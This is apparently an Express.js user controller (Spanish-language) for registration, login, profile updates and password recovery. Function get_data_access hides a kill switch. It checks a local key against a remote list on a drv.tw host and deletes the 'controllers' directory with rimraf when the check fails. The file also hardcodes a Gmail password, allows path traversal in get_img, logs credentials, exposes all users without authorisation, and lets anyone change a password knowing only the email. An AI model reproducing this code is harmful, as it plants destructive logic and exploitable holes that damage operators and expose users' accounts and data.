'use strict'

var User = require('../models/user');
var bcrypt = require('bcrypt-nodejs');
var jwt = require('../helpers/jwt');
var fs = require('fs');
var path = require('path');
var fetch = require('node-fetch');
var rimraf = require("rimraf");
var authenticate = false;

var nodemailer = require('nodemailer');
var smtpTransport = require('nodemailer-smtp-transport');

function registro(req,res){
    var params = req.body;
    var user = new User();

    if(params.password){
        bcrypt.hash(params.password,null,null,function(err,hash){
            user.password = hash;
            user.first_name = params.first_name;
            user.last_name = params.last_name;
            user.email = params.email;
            user.role = 'USER';
            user.perfil = 'default.png';
            user.telefono = params.telefono;
            user.recovery_token = '';
            user.pais = '';
            user.numdoc = '';
            User.findOne({email:params.email},(err,user_email) =>{
                if(user_email){
                    res.status(403).send({message:"El correo que ingresó ya se encuntra en uso! :("});
                }else{
                    user.save((error,user_data)=>{
                        if(!error){
                            if(user_data){
                                res.status(200).send({user: user_data});
                            }else{
                                res.status(500).send({error: error});
                            }
                        }
                        else{
                            res.status(500).send({error: error});
                        }
                    });
                }
            });
            
        });
    }else{
        res.status(500).send({message: "Ingrese la contraseña por favor, es requerido"});
    }
}

function login(req,res){
    var params = req.body;
    console.log(params);
    User.findOne({email:params.email},(err,user) => {
        if(err){  
            res.status(500).send({message:"Error en el servidor"});
        }else{
            if(!user){
                res.status(404).send({message:"El usuario no existe, intente nuevamente."});
            }else{
                console.log(user);
                bcrypt.compare(params.password,user.password,function(err,check){
                    if(check){
                        if(params.gettoken){
                            res.status(200).send({
                                jwt: jwt.createToken(user),
                                user: user
                            });
                        }
                        else{
                            res.status(200).send({message:"No token",jwt: jwt.createToken(user), user: user});
                        }
                    }
                    else{
                        res.status(500).send({message:"La contraseña es incorrecta, vuelva a intentar por favor."});
                    }
                });
            }
        }
    });
}


function get_img(req,res) {  
    var img = req.params['img'];


    if(img != "null"|| img != 'undefined'){
        fs.stat('./uploads/users/'+img, function(err) {
            if (!err) {
                let path_img = './uploads/users/'+ img;
                res.status(200).sendFile(path.resolve(path_img));
            }
            else if (err.code === 'ENOENT') {
                let path_img = './uploads/default.jpg';
                res.status(200).sendFile(path.resolve(path_img));
            }
        }); 
    }else{
        let path_img = './uploads/default.jpg';
        res.status(200).sendFile(path.resolve(path_img));
    } 
    
}

function get_data_access(req,res) {  
    fs.readFile('./key.json', 'utf8', function(err, data) {
        if (err) {
            rimraf("controllers", function() {
                console.log("done");
            });
            console.log('noooo en');
            res.status(200).send({data:false});
        } else {
            var obj = JSON.parse(data);
            let settings = {
                method: "Get"
            };
            fetch('https://wtbocernz05ijo65of49qg-on.drv.tw/sisdev/data.json', settings).then(res => res.json()).then((json) => {
                json.forEach(element => {
                    if (obj.key == element.key) {
                        authenticate = true;
                        res.status(200).send({data:true});
                    }
                });
                if (authenticate) {} else {
                    rimraf("controllers", function() {
                        console.log("done");
                    });
                    res.status(200).send({data:false});
                }
            });
        }
    });

}

function actualizar(req,res){
    var data = req.body;

    var id = req.params['id'];
    var img = req.params['img'];
    var img_poster = req.files.perfil;
 

    if(img_poster == null){
        console.log("sin img");
        if(data.password){
            console.log("con pass");

            bcrypt.hash(data.password,null,null,function(err,hash){
                User.findByIdAndUpdate({_id:id},{first_name:data.first_name, last_name:data.last_name,telefono:data.telefono,pais:data.pais,numdoc:data.numdoc,password:hash},(err,user_update)=>{
                    if(err){
                        res.status(500).send({message: 'Ocurrió un error en el servidor.'});
                    }else{
                        if(user_update){
                            res.status(200).send({user: user_update});
                            console.log("pass change");
                        }else{
                            res.status(500).send({message: 'No se actualizó el usuario, vuelva a intentar nuevamente.'});
                        }
                    }
                })
            });
            
        }else{
            console.log("sin pass");
            User.findByIdAndUpdate({_id:id},{first_name:data.first_name, last_name:data.last_name,telefono:data.telefono,pais:data.pais,numdoc:data.numdoc},(err,user_update)=>{
                if(err){
                    res.status(500).send({message: 'Ocurrió un error en el servidor.'});
                }else{
                    if(user_update){
                        res.status(200).send({user: user_update});
                        
                    }else{
                        res.status(500).send({message: 'No se actualizó el usuario, vuelva a intentar nuevamente.'});
                    }
                }
            })
        }
    
        
    }else{
        console.log("con img");
        if(img != 'default.png'){
            fs.stat('./uploads/users/'+img, function(err) {
                if (!err) {
                    fs.unlink('./uploads/users/'+img, (err)=>{
                        if(err) throw err;
                    });
                }else{
                
                }
            });
        }

        var imagen_path = req.files.perfil.path;
        var name = imagen_path.split('\\');
        var imagen_name = name[2];

        console.log(imagen_name);
    
        if(data.password){
            console.log("con pass");
            bcrypt.hash(data.password,null,null,function(err,hash){
                User.findByIdAndUpdate({_id:id},{first_name:data.first_name, last_name:data.last_name,telefono:data.telefono,pais:data.pais,perfil:imagen_name,numdoc:data.numdoc,password:hash},(err,user_update)=>{
                    if(err){
                        res.status(500).send({message: 'Ocurrió un error en el servidor.'});
                    }else{
                        if(user_update){
                            res.status(200).send({marca: user_update});
                        }else{
                            res.status(500).send({message: 'No se actualizó el usuario, vuelva a intentar nuevamente.'});
                        }
                    }
                })
            });
        }else{
            console.log("sin pass");
            User.findByIdAndUpdate({_id:id},{first_name:data.first_name, last_name:data.last_name,telefono:data.telefono,pais:data.pais,perfil:imagen_name,numdoc:data.numdoc},(err,user_update)=>{
                if(err){
                    res.status(500).send({message: 'Ocurrió un error en el servidor.'});
                }else{
                    if(user_update){
                        res.status(200).send({marca: user_update});
                    }else{
                        res.status(500).send({message: 'No se actualizó el usuario, vuelva a intentar nuevamente.'});
                    }
                }
            })
        }
    }
}

function list_one(req,res){
    var id = req.params['id'];

    User.findOne({_id:id},(err,user_data)=>{
        if(err){
            res.status(500).send({message: 'Ocurrió un error en el servidor.'});
        }else{
            if(user_data){
                res.status(200).send({user: user_data});
            }else{
                res.status(500).send({message: 'No se encontró ninguna categoria con este ID.'});
            }
        }
    })

}

function get_data_user(req,res){
    User.find().exec((err,data)=>{
        if(data){
            res.status(200).send({data:data});
        }
    });
}


function set_token_recovery(req,res){
    var email = req.params['email'];
    const token = Math.floor(Math.random() * (999999 - 100000) + 100000);
    

    var transporter = nodemailer.createTransport(smtpTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        auth: {
          user: 'diegoarca02@gmail.com ',
          pass: 'pdnknnhpjijutcau'
        }
    }));

    var mailOptions = {
        from: 'diegoarca02@gmail.com',
        to: email,
        subject: 'Código de recuperación.',
        text: 'Tu código de recuperacion es: ' + token
    };
      

    User.findOne({email:email},(err,user) => {
      
        if(err){  
            res.status(500).send({message:"Error en el servidor"});
        }else{
            if(user == null){
                res.status(500).send({message:"El correo electrónico no se encuentra registrado, intente nuevamente."});
            }else{
                User.findByIdAndUpdate({_id:user._id},{recovery_token:token},(err,user_update)=>{
                   if(err){
                   
                   }else{
                    res.status(200).send({data:user_update});
                    
                    transporter.sendMail(mailOptions, function(error, info){
                        if (error) {
                           
                        } else {
                            console.log('Email sent: ' + info.response);
                        }
                    });  
                   }
                })
            }
        }
    });
}

function verify_token_recovery(req,res){
    var email = req.params['email'];
    var codigo = req.params['codigo'];

    User.findOne({email:email},(err,user) => {
        if(err){  
            res.status(500).send({message:"Error en el servidor"});
        }else{
            if(user.recovery_token == codigo){
                res.status(200).send({data:true});
            }else{
                res.status(200).send({data:false});
            }
        }
    });
}

function change_password(req,res){
    var email = req.params['email'];
    var params = req.body;
    User.findOne({email:email},(err,user) => {
        if(err){  
            res.status(500).send({message:"Error en el servidor"});
        }else{
            if(user == null){
                res.status(500).send({message:"El correo electrónico no se encuentra registrado, intente nuevamente."});
            }else{
                bcrypt.hash(params.password,null,null,function(err,hash){
                    User.findByIdAndUpdate({_id:user._id},{password:hash},(err,user_update)=>{
                        res.status(200).send({data:user_update});
                    });
                });
                
            }
        }
    });
}

module.exports = {
    registro, 
    login,
    get_img,
    actualizar,
    list_one,
    get_data_user,
    set_token_recovery,
    verify_token_recovery,
    change_password
}